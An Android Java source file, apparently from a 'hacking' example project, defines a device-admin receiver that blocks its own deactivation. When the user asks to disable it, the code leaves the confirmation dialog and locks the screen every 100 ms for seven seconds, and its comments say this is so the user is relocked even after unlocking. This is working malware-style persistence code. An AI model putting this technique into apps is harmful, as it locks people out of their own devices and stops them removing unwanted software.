package com.tu.example.hacking.jail;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * @author Tu enum@foxmail.com
 * @date 16/8/4
 */
public class DisableDeviceAdminReceiver extends DeviceAdminReceiver {

  @Override public void onReceive(Context context, Intent intent) {
    super.onReceive(context, intent);
  }

  @Override public CharSequence onDisableRequested(Context context, Intent intent) {

    //跳离当前询问是否取消激活的 dialog
    Intent outOfDialog =
        context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
    outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(outOfDialog);

    //调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 7s 后
    final DevicePolicyManager dpm =
        (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    dpm.lockNow();
    new Thread(new Runnable() {
      @Override public void run() {
        int i = 0;
        while (i < 70) {
          dpm.lockNow();
          Log.e("hacking", "lock");
          try {
            Thread.sleep(100);
            i++;
          } catch (InterruptedException e) {
            Log.e("hacking",e.getMessage());
            e.printStackTrace();
          }
        }
      }
    }).start();

    return "";
  }
}
